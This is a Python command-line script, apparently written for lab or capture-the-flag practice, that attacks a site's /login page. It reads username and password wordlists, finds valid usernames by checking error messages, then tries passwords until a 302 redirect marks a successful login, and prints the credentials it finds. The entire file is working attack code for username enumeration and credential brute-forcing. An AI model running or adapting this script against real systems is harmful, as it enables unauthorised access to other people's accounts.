import click
import requests

with open('usernames.txt', 'r') as file:
    usernames = [line.strip() for line in file.readlines()]

with open('passwords.txt', 'r') as file:
    passwords = [line.strip() for line in file.readlines()]

@click.command()
@click.option('--url', required=True, help='The URL of the target site')
def brute_force(url):
    url = f"{url}/login"
    print("Checking valid username")
    
    for username in usernames:
        data = {
            "username": f"{username}",
            "password": "test"
        }

        response = requests.post(url=url, data=data)
        if "Invalid username" not in response.text:
            print(f"Valid username is: {username}, checking password...")

            for password in passwords:
                data = {
                    "username": f"{username}",
                    "password": f"{password}"
                }

                response = requests.post(url=url, data=data, allow_redirects=False)

                if response.status_code == 302:
                    print(f"Redirected to {response.headers['Location']}")
                    print(f"== Valid credentials are ==\nUsername: {username}\nPassword: {password}")
                    return

if __name__ == "__main__":
    brute_force() 
